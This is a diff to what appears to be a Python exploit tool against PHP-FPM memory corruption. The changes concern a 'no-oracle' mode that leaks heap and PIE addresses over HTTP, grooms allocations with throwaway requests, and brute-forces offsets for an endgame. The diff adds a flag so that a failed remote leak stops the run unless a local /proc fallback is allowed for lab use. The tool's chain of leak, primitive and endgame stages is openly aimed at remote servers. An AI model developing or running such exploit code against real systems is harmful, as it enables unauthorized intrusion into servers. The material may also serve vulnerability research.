@@ -955,11 +955,12 @@ def cmd_no_oracle(args) -> int:
     """HTTP-only endgame: no /proc/<pid>/mem reads at exploit time.
 
     The absolute heap/PIE bases are stable for the lifetime of the FPM
-    master (workers are forked from it).  By default they are leaked over
-    HTTP; --chunk/--pie override the leak and /proc/<pid>/maps is a local
-    fallback.  The reclaim geometry is normalized with one throw-away
-    pads+big request to a 404 endpoint (same allocation shape as
-    _probe_cover, no scanning), then the (d-offset, content-offset) pair
+    master (workers are forked from it).  They are leaked over HTTP, or
+    supplied with --chunk/--pie.  This mode never uses /proc unless the
+    explicit --allow-local-fallback lab flag is set; a failed HTTP leak is
+    an error for a remote target.  The reclaim geometry is normalized with
+    one throw-away pads+big request to a 404 endpoint (same allocation shape
+    as _probe_cover, no scanning), then the (d-offset, content-offset) pair
     is brute-forced over the two slots and their possible cover offsets.
     """
     pie = getattr(args, "pie", 0)
@@ -971,6 +972,11 @@ def cmd_no_oracle(args) -> int:
                   f"pie=0x{pie:x} chunk=0x{chunk:x}")
         except (OSError, RuntimeError) as exc:
             print(f"[!] HTTP leak failed: {exc}")
+            if not getattr(args, "allow_local_fallback", False):
+                print("[!] strict remote mode: refusing local /proc fallback")
+                print("    retry the leak, or pass --chunk/--pie "
+                      "(stable for the FPM master lifetime)")
+                return 1
             try:
                 pie, chunk = _local_bases(args.version)
             except (OSError, RuntimeError) as local_exc:
@@ -1102,7 +1108,11 @@ def main() -> int:
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
                  "leak", "no-oracle"):
-        sub.add_parser(name)
+        subparser = sub.add_parser(name)
+        if name == "no-oracle":
+            subparser.add_argument(
+                "--allow-local-fallback", action="store_true",
+                help="allow /proc/<pid>/maps if the HTTP leak fails (lab only)")
     args = parser.parse_args()
     dispatch = {
         "lifecycle": cmd_lifecycle,
